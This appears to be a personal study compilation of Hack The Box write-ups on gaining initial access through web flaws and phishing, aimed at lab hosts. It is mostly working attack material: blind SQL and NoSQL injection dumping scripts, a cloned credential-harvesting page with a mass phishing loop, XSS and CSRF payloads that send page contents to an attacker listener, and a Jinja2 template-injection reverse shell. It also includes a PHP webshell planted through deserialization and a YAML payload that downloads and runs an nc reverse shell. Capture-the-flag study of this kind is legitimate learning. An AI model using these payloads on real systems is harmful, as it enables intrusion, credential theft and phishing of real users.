# 2. Initial access & Foothold

I think the best place to learn web security is [web security academy](https://portswigger.net/web-security) whose learning materials and labs are free. Web vulnerability classification is based on this.

[TOC]

## Web vulnelrabilities

### SQLI

#### 1. Machine Intense (10.10.10.195)

Download src.zip code. Open your big eyes to analyze it. The /submitmessage endpoint takes in a message through a POST request, checks it for bad words and then inserts it into the database. We notice that the message variable is passed to the SQL query without any sanitization.  The code:  query_db("insert into messages values ('%s')" % message),which makes the query vulnerable to SQL injection with SQLite as the backend database.

Reference: Intense official writeup or [HTB：Intense](https://0xdf.gitlab.io/2020/11/14/htb-intense.html)。

```shell
# response: OK
message=' and case when (1=1) then 1 else load_extension(1) end)-- -
# response: not authorized
message=' and case when (1=2) then 1 else load_extension(1) end)-- -
# admin exists
message=' and case when (select 1 from users where username='admin') then 1 else
load_extension(1) end)-- -
# use substr to dump pass hash
message=' and case when (select substr((select secret from users where username='admin'),1,1)='0') then 1 else load_extension(1) end)-- -
```

```python
import requests
import sys

chars = "0123456789abcdef"
url = "http://10.10.10.195/submitmessage"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
pass_hash = ""
for i in range(1, 65):
    for c in chars:
        sys.stdout.write(f"\r[+] Pass_hash: {pass_hash}{c}")
        sys.stdout.flush()
        resp = requests.post(url,data=f"message=' and case when (select substr((select secret from users where username = 'admin'), {i}, 1)='{c}') then 1 else load_extension(1) end)-- -",headers=headers,)
        if "OK" in resp.text:
            pass_hash += c
            break
```



#### 2. Machine Multimaster (10.10.10.179)

Try injecting a quote and check the response to test for SQL injection vulnerability.

```shell
curl 'http://multimaster.htb/api/getColleagues' -H 'Accept: application/json, text/plain, */*' -H 'Content-Type: application/json;charset=utf-8' --data-raw '{"name":"a"}'
# result:
# [{"id":1,"name":"Sarina Bauer","position":"Junior Developer","email":"sbauer@megacorp.htb","src":"sbauer.jpg"},
# {"id":2,"name":"Octavia Kent","position":"Senior Consultant","email":"okent@megacorp.htb","src":"okent.jpg"}, ...]
```

Official writeup：*Examination of the JSON RFC reveals that default encoding is UTF-8 , but it also supports UTF-16 and UTF-32 encoding. Let's try injecting a quote in UTF-16 format*.

```shell
sqlmap -r burp.request --dbms=mssql --dbs --tamper=charunicodeescape --level=3 -v 3
```

SQL Server has a function SUSER_SID() , which returns a Security Identification Number (SID) for a given user. Let's use this to identify the SID of the primary domain administrator.  

```
test' union select 1,2,3,4,SUSER_SID('MegaCorp\Administrator')-- -  
```

Also,we can use mssqli-duet.py, which is a MSSQL Injection-based Domain User Enumeration Tool.

```shell
python3 mssqli-duet.py -i "a'" -t 0 -rid 1000-1200 -p name -r burp.request -t 5 -e unicode
```



#### 3. Machine Mango (10.10.10.162)

Its subdomain is staging-order.mango.htb. Burp on,find POST params: `username=&password=&login=login`. Basic SQLi attacks not working, we can change to NoSQL injection.In general, you should also try XSS and XXE attacks.

Reference: [Nosql injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)。

```python
'''dump all users'''
import requests
import string

user = ""
url = "http://staging-order.mango.htb/index.php"

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|']:
            payload = 'username[$regex]=^%s&password[$ne]=1&login=login' % user
            r = requests.post(url, data=payload, verify=False, allow_redirects=False)
            if r.status_code == 302:
                print("[+] Found one more char : %s" % (user + c))
                user + c
'''
# dump pass hash
while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|']:
            payload = 'username=admin&password[$regex]=^%s&login=login' % pass
            r = requests.post(url, data=payload, verify=False, allow_redirects=False)
            if r.status_code == 302:
                print("[+] Found one more char : %s" % (pass + c))
                pass + c
'''
```



#### 4. Machine Proper (10.10.10.231)

Burp on ,Obviously a request `http://10.10.10.231/products-ajax.php?order=id&h=bfe31138f2d38085d891b972aca749ba` seems vulnerable to SQL injection. And **param h** is likely md5 value but can't break.  Using the salt got from other place and testing repeatedly, eventually,confirm that it is hashed by MD5(salt+query) .

```shell
echo -n 'theSaltid' | md5sum
# bfe31138f2d38085d891b972aca749ba  -
sqlmap -u 'http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="import hashlib;h=hashlib.md5(b'the slat'+bytes(order,'ascii')).hexdigest()" --dbs -v 3
```



### Phishing

Reference：[Phishing for Information](https://attack.mitre.org/techniques/T1598)，[Phishing](https://attack.mitre.org/techniques/T1566)

#### 1. Machine SneakyMailer (10.10.10.197）

Basic idea: Get email user list from team.php and Phish to receive credentials using swaks. 

Most writeups online just set a listener or a web server and didn't clone the site. That's not real. The following are all from official writeup.

- step 1. Save the register.php page and replace the hyperlinks to point to the actual site by issuing the below commands.

  ```shell
  mkdir templates
  curl http://sneakycorp.htb/pypi/register.php -o templates/register.php
  sed -i 's/\/vendor/http:\/\/sneakycorp.htb\/vendor/g' templates/register.php
  sed -i 's/\/css\//http:\/\/sneakycorp.htb\/css\//g' templates/register.php
  ```

- step 2. Host the page in a web server. The below script starts a web server on port 80 and prints whatever content is received from a POST request, allowing the web server to capture any inputted employee credentials. It then submits the content to the actual site and redirects them to the original application. 

  ```python
  from flask import *
  import requests
  app = Flask(__name__)
  
  @app.route('/pypi/register.php',methods=['GET','POST'])
  def register():
      if request.method=="GET":
          return render_template("register.php")
      else:
          print(request.args)
          print(request.form)
  	requests.post('http://sneakycorp.htb/pypi/register.php',data=request.form)
  	return redirect('http://sneakycorp.htb',code=302)
  
  app.run('0.0.0.0',80)
  ```

- step 3. Send the phishing emails using the swaks utility. Run the below script to send an email to each team member from a targetted person in the organization.

  ```shell
  while read email; do
  echo "[+] Sending email from $email" 
  swaks --from support@sneakymailer.htb --to $email --header 'Subject: Register in the portal' --body 'http://youhttpserver/pypi/register.php' --server sneakycorp.htb >/dev/null
  done < emails.txt
  ```

  

#### 2. Machine Reel (10.10.10.77)

Using the Office OLE2Link vulnerability [cve-2017-0199_toolkit.py](https://github.com/bhdresh/CVE-2017-0199/blob/master/cve-2017-0199_toolkit.py) to generate RTF malicious file, also we can use msf exploit (windows/fileformat/office_word_hta) module to generate malicious doc document (rtf file), then sendEmail. Listener on, reverse shell comes.

Reference：[HTB: Reel Writeup](https://0xdf.gitlab.io/2018/11/10/htb-reel.html)

```shell
# attachment_phishing.doc from msf
{\rtf1\adeflang1025\ansi\ansicpg1252\uc1\adeff31507\deff0\stshfdbch31505\stshfloch31506\stshfhich31506\stshfbi31507\deflang1033\deflangfe2052\themelang1033\themelangfe2052\themelangcs0
{\info
{\author Microsoft}
{\operator Microsoft}
}
{\*\xmlnstbl {\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}
{
{\object\objautlink\objupdate\rsltpict\objw291\objh230\objscalex99\objscaley101
{\*\objclass Word.Document.8}
{\*\objdata 010500000000000000000000000000000000000000000
......
0105000000000000}
{\result {\rtlch\fcs1 \af31507 \ltrch\fcs0 \insrsid1979324 }}}}
{\*\datastore }
}
```

```shell
sendEmail -f test@megabank.com -t target@megabank.com -u "Subject" -m "Body" -a attachment_phishing.doc -s 10.10.10.77
```



#### **3**. Machine Reel2 (10.10.10.210)

After got a user and pass,login to `https://reel2.htb/owa`. Create a new email, add all users of address book to the recipient, set body `http://tun0's Ip`, and send it.

```shell
responder -I tun0

john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

After sending the email, in a minute or so we receive the Net-NTLMv2 hash for the user htb\k.svensson.  Save the hash to a file and let's attempt to crack it with John The Ripper or hashcat.  

Reference：[NetNTLMv2 hash stealing using Outlook](https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook)



### XSS

#### 1. Machine Crossfit(10.10.10.208)

Enumeration of the web site reveals a few input forms. Under each post there is a comment form
for users to submit comments on the **blog-single.php** page.  A second form is found on the Get In Touch **contact.php** page, which can be used to send a message to the website administrators.  Since there is a possibility of someone viewing this comment manually, it is worth checking if the form is vulnerable to Cross Site Scripting.  

The most common payload to test for an XSS vulnerability is the alert function.  

```javascript
<script>alert('XSS')</script>
```

After the comment is submitted, a message informs us that a Cross Site Scripting attempt was detected and blocked.  A hint indicates that comments would be reviewed by a moderator , while security reports will be analyzed by the "admin team". An admin would probably have more access than a moderator,and would be a better target.
Let's run a GoBuster scan on the web server, and gain a better understanding of the scenario we
are facing.  

```shell
gobuster dir -u http://gym-club.crossfit.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 80

...
/images (Status：301)
/css (Status：301)
/js (Status：301)
/vendor (Status：301)
/security_threat (Status：301)
...
```

The scan reveals a directory called security_threat which contains a file called report.php,but can't read it.  

So when we tried to send an XSS payload, it's possible that an administrator can view it.  

The alert thrown when an XSS attempt is detected states that our browser information will be included in the generated report. It is worth checking if the User-Agent header can be abused in order to successfully exploit the XSS vulnerability.  

Send a comment that contains a **\<script\>** tag to trigger the XSS detection, and intercept the
request in Burp. 

Modify the User-Agent and the request wiil be:

```http
POST /blog-single.php HTTP/1.1
Host: gym-club.crossfit.htb
User-Agent: <script src="http://10.10.x.x/"></script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflates
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
Connection: close

name=test&email=test@test.htb&message=test&submit=submit
```

Open a Netcat listener on port 80.  

A message informs us that an XSS attempt was detected. However, a connection is received on the Netcat listener, and the XSS vulnerability is confirmed.

After getshell,we can cd the /var/www/gym-club/ directory and read source codes.we can understand how it works.

blog-single.php:

```php
<?php
include ("functions.php");
if (isset($_POST['submit'])) {
    if (empty($_POST['name']) || empty($_POST['email']) || empty($_POST['phone']) || empty($_POST['message'])) {
        echo ("<div class='alert alert-warning' role='alert'>Please fill all the input fields.</div><br>");
    } else if (detectXSS($_POST['message'])) {
        echo ("<div class='alert alert-danger' role='alert'><h4>XSS attempt detected</h4><hr>A security report containing your IP address and browser information will be generated and our admin team will be immediately notified.</div><br>");
        notifyXSS();
    } else {
        echo ("<div class='alert alert-success' role='alert'><h4>Comment submitted</h4><hr>Your comment has been succesfully submitted and will be evaulated by a moderator. Thank you for posting!</div><br>");
    }
}
?>
......
```

functions.php:

```php
<?php
/* Code borrowed from https://github.com/symphonycms/xssfilter */
/*
All source code included in the "Cross-Site Scripting (XSS) Filter" Symphony Extension archive
is, unless otherwise specified, released under the MIT licence as follows:
----- begin license block -----
......
----- end license block -----
*/
/**
 * Given a string, this function will determine if it potentially an
 * XSS attack and return boolean.
 *
 * @param string $string
 *  The string to run XSS detection logic on
 * @return boolean
 *  True if the given `$string` contains XSS, false otherwise.
 */
function detectXSS($string) {
	$contains_xss = FALSE;

	// Skip any null or non string values
	if(is_null($string) || !is_string($string)) {
		return $contains_xss;
	}

	// Keep a copy of the original string before cleaning up
	$orig = $string;

	// URL decode
	$string = urldecode($string);

	// Convert Hexadecimals
	$string = preg_replace_callback('!(&#|\\\)[xX]([0-9a-fA-F]+);?!', function($m) {
		return chr(hexdec($m[2]));
	}, $string);

	// Clean up entities
	$string = preg_replace('!(&#0+[0-9]+)!','$1;',$string);

	// Decode entities
	$string = html_entity_decode($string, ENT_NOQUOTES, 'UTF-8');

	// Strip whitespace characters
	$string = preg_replace('!\s!','',$string);

	// Set the patterns we'll test against
	$patterns = array(
		// Match any attribute starting with "on" or xmlns
		'#(<[^>]+[\x00-\x20\"\'\/])(on|xmlns)[^>]*>?#iUu',

		// Match javascript:, livescript:, vbscript: and mocha: protocols
		'!((java|live|vb)script|mocha|feed|data):(\w)*!iUu',
		'#-moz-binding[\x00-\x20]*:#u',

		// Match style attributes
		'#(<[^>]+[\x00-\x20\"\'\/])style=[^>]*>?#iUu',

		// Match unneeded tags
		'#</*(applet|meta|xml|blink|link|style|script|embed|object|iframe|frame|frameset|ilayer|layer|bgsound|title|base)[^>]*>?#i'
	);

	foreach($patterns as $pattern) {
		// Test both the original string and clean string
		if(preg_match($pattern, $string) || preg_match($pattern, $orig)){
			$contains_xss = TRUE;
		}
		if ($contains_xss === TRUE) return TRUE;
	}

	return FALSE;
}

function notifyXSS()
{
    if(isset($_SERVER['HTTP_USER_AGENT']))
    {
        $ua = $_SERVER['HTTP_USER_AGENT'];
    }
    else
    {
        $ua = "None";
    }
    $ip = ip2long($_SERVER['REMOTE_ADDR']);

    require("db.php");
    if($conn)
    {
        $stmt = $conn->prepare('INSERT INTO security_report (timestamp, ua, ip) VALUES (NOW(), ?, ?)');
        $stmt->bind_param("si", $ua, $ip);
        $stmt->execute();
        $stmt->close();    
    }
}
?>
```

security_threat/report.php:

```php
<?php
......
$conn = new mysqli($host, $user, $pass, $db);
if($conn)
{
    $res = $conn->query('SELECT * FROM security_report LIMIT 1');
    while($row = $res->fetch_array(MYSQLI_ASSOC))
    {
        echo "<tr>";
        echo "<td>" . $row['timestamp'] . "</td>";
        echo "<td>" . $row['ua'] . "</td>";			// !!! XSS
        echo "<td>" . long2ip($row['ip']) . "</td>";
        echo "</tr>";
        $conn->query('DELETE FROM security_report WHERE id='.$row['id']);
    }
}
?>
```



### CORS

#### 1. Machine Crossfit(10.10.10.208)

The XSS vulnerability is confirmed. It's worth investigating if the XSS vulnerability can be abused to make the victim's web browser issue XMLHttpRequests for web pages that we don't have access to, effectively turning XSS into Cross Site Request Forgery. Since we have already scanned directories on the gymclub.crossfit.htb domain without finding any potential targets, let's fuzz for other potential subdomains using wfuzz. 

```shell
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.crossfit.htb" --hh 10701 http://10.10.10.208
```

Results with a length of 10701 characters are excluded, since that is the number of characters in the default Apache page that is shown for non-existing virtual hosts. Unfortunately, wfuzz does not reveal any new virtual hosts.

If we want to make cross-origin requests to a different domain, this would normally be blocked by the same-origin policy. It is possible that appropriate CORS rules are in place to allow this (see for example the article https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). If a subdomain (let's call it domain2 ) allows cross-origin resource requests from the gymclub.crossfit.htb domain, and if the trust relationship is mutual (meaning the gymclub.crossfit.htb domain also allows requests from domain2 ), then the web  server at http://gymclub.crossfit.htb would respond with an appropriate Access-Control-AllowOrigin header to requests having the Origin header set to http://domain2.crossfit.htb. Instead of fuzzing the Host header, we can fuzz the Origin header. To build our command we can refer to the Wfuzz documentation. Use the following syntax.

```shell
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.crossfit.htb" --filter "r.headers.response~'Access-ControlAllow-Origin'" http://gym-club.crossfit.htb/

# ftp
```

This will add an Origin header to requests and filter results based on the presence of an AccessControl-Allow-Origin response header. 

The subdomain ftp.crossfit.htb is identified. After navigating to http://ftp.crossfit.htb with our browser the default Apache page is returned. The ftp domain could be reachable from the internal network, which makes it a potential target for our XSS to CSRF attack.  



### CSRF

#### 1. Machine Crossfit(10.10.10.208)

In order to get the contents of the http://ftp.crossfit.htb page, we can create the following JavaScript file called **Payload1.js**.  

```javascript
xhr.onreadystatechange = function() {
    if (this.readyState === 4 && this.status === 200) {
        var xhr2 = new XMLHttpRequest();
        xhr2.open("POST", "http://10.10.x.x:8000/", false);
        xhr2.send(this.responseText);
    }
};
xhr.open("GET", "http://ftp.crossfit.htb", false);
xhr.send();
```

This will make a synchronous GET request to http://ftp.crossfit.htb and send us back the results
in the body of a POST request. Open a Python3 HTTP server on port 80.  Then start a Netcat listener on port 8000.  Edit the User-Agent header like this.  

```
<script src="http://10.10.x.x/payload1.js"></script>
```

Send the request and after a short while our JavaScript payload is downloaded and executed,
returning to us the contents of the FTP index page.  

```html
<html>
<head>
    <title>FTP Hosting - Account Management</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css" rel="stylesheet">
</head>
<body>
    <br>
    <div class="container">
        <div class="row">
            <div class="col-lg-12 margin-tb">
                <div class="pull-left">
                    <h2>FTP Hosting - Account Management</h2>
                </div>
                <div class="pull-right">
                    <a class="btn btn-success" href="http://ftp.crossfit.htb/accounts/create"> Create New Account</a>
                </div>
            </div>
        </div>
        <table class="table table-bordered">
            <tr>
                <th>No</th>
                <th>Username</th>
                <th>Creation Date</th>
                <th width="280px">Action</th>
            </tr>
        </table>
    </div>
</body>
</html>
```

Create a new JavaScript file called **payload2.js** to request the "Create New Account" page located at /accounts/create.  

```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (this.readyState === 4 && this.status === 200) {
        var xhr2 = new XMLHttpRequest();
        xhr2.open("POST", "http://10.10.x.x:8000/", false);
        xhr2.send(this.responseText);
    }
};
xhr.open("GET", "http://ftp.crossfit.htb/accounts/create", false);
xhr.send();
```

Edit the User-Agent headerand send the request.

On our Netcat listener we get the source code of http://ftp.crossfit.htb/accounts/create . 

```html
<SNIP>
<title>FTP Hosting - Account Management</title>
<form action="http://ftp.crossfit.htb/accounts" method="POST">
	<input type="hidden" name="_token" value="krinsa1N93hm7CGkUW7.....">
	<input type="text" name="username" placeholder="Username">
	<input type="text" name="password" placeholder="Password">
	<button type="submit">Submit</button>
</form>
</SNIP>
```

The form should allow us to create a new user, but we have to take care of the anti-CSRF token, which is called _token in the HTML source code. In this framework (i.e Laravel), anti-CSRF tokens are tied to the session, so we need a way to keep the session between XMLHttpRequests . We can't get the page with a single request, copy the token and then post the form with a second request because we would have two separate sessions and the token we send would be invalid. Use `curl -I http://gym-club.crossfit.htb` to confirm the **Access-Control-Allow-Credentials** header is set to true on the gym-club.crossfit.htb domain, and the same can be assumed for the ftp subdomain.  

This should allow us to set the [withCredentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials) properties of our XMLHttpRequest to true, in order to maintain the session cookie between consecutive requests.
Steps for potential exploitation:

1. Get the /accounts/create page.
2. Parse the results and retrieve the _token parameter.

3. Make a POST request to the /accounts page to add a user named user1 with password pass1 .

4. Send the results back to our Netcat listener on port 8000.

The XMLHttpRequests will be run synchronously. This is preferred because asynchronous calls run in parallel and in this case, as we are dealing with HTTP requests, which take time, and asynchronous requests might result in incorrect results or errors.  

Requests one and three will have the withCredentials property set to true in order to keep
the same session. Sav the below payload as payload3.js . 

```javascript
xhr.onreadystatechange = function() {
    if (this.readyState == 4) {
        // 2) Parse the response and retrieve the anti-CSRF token (_token)
        var parser = new DOMParser();
        var doc = parser.parseFromString(this.responseText, "text/html");
        var token = doc.getElementsByName('_token')[0].value;
        var xhr3 = new XMLHttpRequest();
        xhr3.onreadystatechange = function() {
            if (this.readyState == 4) {
                // 4) Sends result back to netcat listener
                var xhr4 = new XMLHttpRequest();
                xhr4.open("POST", "http://10.10.x.x:8000/", false);
                xhr4.send(this.responseText);
            }
        };
        // 3) Make a POST request to the /accounts page to add a new user
        xhr3.open("POST", "http://ftp.crossfit.htb/accounts", false);
        xhr3.withCredentials = true;
        xhr3.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        var params = "username=user1&pass=pass1&_token=" + token;
        xhr3.send(params);
    }
};
// 1) Get the /accounts/create page
xhr.open("GET", "http://ftp.crossfit.htb/accounts/create", false);
xhr.withCredentials = true;
xhr.send();
```

Modify the User-Agent in our Burp Repeater window to serve the payload3.js file, open a Python3 HTTP server on port 80 and a Netcat listener on port 8000, and send the request.  

After about a minute our JavaScript payload is downloaded and executed.

Then access the FTP server with the credential and upload shell.php to getshell.



### SSRF



### XXE



### LFI/RFI

#### [1. Machine Tabby(10.10.10.194)](#3. Machine Tabby(10.10.10.194))



### Directory Traversal   

#### 1. Machine Breadcrumbs(10.10.10.228)

Notice that book.js has a function.

```javascript
function searchBooks(title, author){
    jQuery.ajax({
        url: "../includes/bookController.php",
        type: "POST",
        data: {
            title: title,
            author: author,
            method: 0,
        },
        dataType: "json",
        success: function(res){
            if(res.length == 0 || res == false){
                $("#message").html("Nothing found :(");
            }
            else{
                let ret = "";
                for(book in res){
                    $("#message").html("");
                    ret += "<tr id='" + res[book].id + "'>";
                    ret += "<td>"+res[book].title+"</td>";
                    ret += "<td>"+res[book].author+"</td>";
                    ret += "<td>" + modal() + "</td>";
                    ret += "</tr>";
                    $("#tableBody").html(ret)
                }
            }
        }
    });
}
```

Use burp to capture the request.

```
POST /includes/bookController.php HTTP/1.1
Host: 10.10.10.228
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

book=book12.html&method=1
```

Check if we can load arbitrary files by altering the parameter `book`.  

we are able to include the win.ini file by setting the parameter to `..\..\..\..\..\..\windows\win.ini  `. This means that the application is vulnerable to path traversal and arbitrary file read.  



### SSTI

#### **1**. Machine Doctor(10.10.10.209)

Register a new account with the credentials test / test. To see if any additional (and exploitable) functionality is available after logging in.  

Inspect the source code of the home page for potential clues. This reveals the following interesting HTML line that has been commented out.

```xml
<!--archive still under beta testing<a class="nav-item nav-link"
href="/archive">Archive</a>-->
```

The comment mentions that a page exists under /archive , but that it's still undergoing beta testing. Navigating to /archive returns a blank page. However, viewing the source code for the page reveals XML output.  

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>Test</title></item>
</channel>
```

The title of the post created earlier is visible in the XML inside the **\<title\>** tags. If the userprovided title value is not sanitized, then the page might be vulnerable to Server Side Template injection (SSTI).
An SSTI occurs when an attacker is able to control the value of a template variable and insert a malicious payload into the template. The template then gets passed to the server and is executed.In order to test for an SSTI vulnerability, the following chart found on [this](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) Github page or [this](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) can be considered.  

Try these payloads as the title and test as the content.  

```
{{7*7}} = 49
${7*7} = ${7*7}
{{foobar}} = Error
{{7*'7'}} = 7777777
```

Input {{7*'7'}} as the title and click Post . The output in the archive page is as follows .

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>7777777</title></item>
</channel>
```

The Github page referenced earlier states that if the output for the above payload is 49 , then the Twig template engine might be in use. On the other hand if 7777777 is the output, then Jinja2 is probably in use. The template engine has been identified as **Jinja2** , and research on reverse shell payloads for this template engine reveal the following code.

```jinja2
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in
x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c
'bash -i >& /dev/tcp/10.10.x.x/1234 0>&1'").read()}}{%endif%}{%endfor%}
```

Modify the IP and port and start a Netcat listener.

```shell
rlwrap nc -lvnp 1234
```

Then create a new message with the code as Title, and navigate to the Archive page in order to execute the payload then getshell.



### Upload

#### [1. Machine Feline(10.10.10.205)](#4. Machine Feline(10.10.10.205))



### Insecure deserialization

#### 1. Machine Tenet(10.10.10.223)

Have sator.php code:

```php
<?php
class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}
	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}
$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();
?>
```

The code defines a class called DatabaseExport that makes use of the __destruct() magic function in order to create a file called users.txt filled with user defined data.
The data is supposed to be read from the arepo parameter using a GET request and unserialized , however, the data is never passed to the instantiated class, as it is noted that the code does not yet work correctly. Finally the update_db() function is called.  

It is possible to exploit the above functionality and specifically the unserialize function in order to abuse
the DatabaseExport class and write a shell into the Web Server folder that could then be used for Remote
Code Execution. First we need to generate though a serialised payload. Consider the following code.  

```php
<?php
class DatabaseExport
{
    public $user_file='attack.php';
    public $data = '<?php system($_GET["cmd"]);?>';
}
$payload = new DatabaseExport;
echo (serialize($payload));
?>
```

```shell
php generate.php
#
# O:14:"DatabaseExport":2:{s:9:"user_file";s:10:"attack.php";s:4:"data";s:29:"<?php system($_GET["cmd"]);?>";}
#
```

We copy the above payload and paste it into the URL as the value of the arepo parameter. Visit attack.php, we get webshell.

```
http://10.10.10.223/sator.php?arepo=O:14:"DatabaseExport":2:
{s:9:"user_file";s:10:"attack.php";s:4:"data";s:29:"<?php system($_GET["cmd"]);?>";}

http://10.10.10.223/attack.php?cmd=id
```



#### 2. Machine Ophiuchi(10.10.10.227)

Apache Tomcat (8080) runs a online YAML parser. 

YAML (YAML Ain't Markup Language) is a popular configuration and serialization language. It's used by a
wide variety of programs such as kubernetes, ansible etc.  

As every serialization format, YAML based parsers are vulnerable to insecure deserialization as well.
Perhaps this is why web was moved from / to /yaml and we know its java application. There are three Java
based libraries for parsing YAML.

- Snake YAML
- jYAML
- YamlBeans  

The following payload can be used to verify if it's possible to invoke methods through deserialization. 

```yaml
!!javax.script.ScriptEngineManager [
	!!java.net.URLClassLoader [[
		!!java.net.URL ["http://10.10.x.x/"]
	]]
]
```

The payload above creates an object of type URL with the argument of our ip 10.10.x.x , resulting in an
HTTP request. We start a python HTTP server and submit the payload above. 

We do get a request back which proves that web application is vulnerable.
A payload can be generated with this [PoC](https://github.com/artsploit/yaml-payload). We clone the repository and edit the src/artsploit/AwesomeScriptEngineFactory.java file to replace the exec code with our reverse shell payload.  

```java
<SNIP>
public AwesomeScriptEngineFactory() throws Exception {
    try {
        Process p = Runtime.getRuntime().exec("wget 10.10.14.2/shell -O /tmp/shell");
        p.waitFor();
        p = Runtime.getRuntime().exec("chmod +x /tmp/shell");
        p.waitFor();
        p = Runtime.getRuntime().exec("/tmp/shell");
        p.waitFor();
     } catch (IOException e) {
        e.printStackTrace();
     }
}
<SNIP>
```

The code above downloads a shell from our server and then executes it. We create a file named shell with
the following contents:  

```shell
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.x.x 4444 >/tmp/f
```

We compile and run the payload as follows. 

```shell
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .  
```

This it will generate a JAR file yaml-payload.jar which we can serve and force YAML parser to execute it.

```yaml
!!javax.script.ScriptEngineManager [
	!!java.net.URLClassLoader [[
		!!java.net.URL ["http://10.10.14.2/yaml-payload.jar"]
	]]
]
```

Sending the payload above should return a reverse shell as the tomcat user.



### HTTP request smuggling



## Web Applications

#### 1. Machine Admirer(10.10.10.187)

After navigating to **adminer.php** page, we find that the version of Adminer is 4.6.2. Adminer is a MYSQL
database management tool, and we are able to input the connection details, including the server
name.  The skill is **Exploiting MySQL Arbitrary File Read via Adminer**.

First way:

```shell
python rogue_mysql_server.py # Don't forget to change filelist
cat mysql.log | grep "pass"
# ssh in with the pass
```

Another way:

Official Writeup gives a very detailed solution to build a fake mysql server.

```shell
# install mysql-server
apt-cache search mysql-server
apt-get install mariadb-server-x.x mariadb-client-x.x
systemctl start mariadb

# set root's pass
mysql -u root -p
ALTER USER 'root'@'localhost' IDENTIFIED BY '<YOUR PASSWORD>';

# create a database
CREATE DATABASE backup; USE backup; CREATE TABLE backup (name VARCHAR(2000));
CREATE USER 'backup'@'10.10.10.187' IDENTIFIED BY '<YOUR PASSWORD>';
GRANT ALL PRIVILEGES ON backup.* TO 'backup'@'10.10.10.187';

# change bind-address to your ip in /etc/mysql/mariadb.conf.d/50-server.cnf

systemctl restart mariadb

# After logging in, read index.php to get useful info.
LOAD DATA LOCAL INFILE '../index.php' INTO TABLE backup.backup FIELDS TERMINATED BY "\n"
```



#### 2. Machine Blunder(10.10.10.191)

Searching online for vulnerabilities related to Bludit CMS version 3.9.2 returns [this](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) blog post. It details a method of bypassing the application's brute force protection.It is common for user passwords to be related to company products and services, so we can create a wordlist from the website text.The website contains multiple pages, so we can use CeWL to automate the process of generating the wordlist.  

```
cewl -d 5 -w wordlist.txt http://blunder.htb --with-numbers
```

```python
#!/usr/bin/env python3
import re
import requests
host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []
words = open('wordlist.txt','r')

for line in words:
    line=line.rstrip()
    wordlist.append(line)
    
for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"',login_page.text).group(1)
    print('[*] Trying: {p}'.format(p = password))
    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    } 
    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }
    login_result = session.post(login_url, headers = headers, data = data,allow_redirects = False)
    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

Then use **msf exploit(linux/http/bludit_upload_images_exec)**  to getshell.



#### 3. Machine Tabby(10.10.10.194)

The site(port 22,80,8080 open) is vulnerable to Local File Inclusion (LFI), by trying to load /etc/passwd.

```shell
curl http://xxx.htb/news.php?file=../../../../etc/passwd
curl http://xxx.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml

<tomcat-users>
	......
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

After google-fu,found tomcat-users.xml location.As the roles xml attribute shows that this user is a member of admin-gui and manager-script . The manager-gui role that allows access to the /manager page is not assigned.  

So fuzz 8080,search online for the /manager/text interface.

```shell
wfuzz -c http://10.10.10.194:8080/manager/FUZZ -w /usr/share/wordlists/dirb/common.txt 
 --hc 404

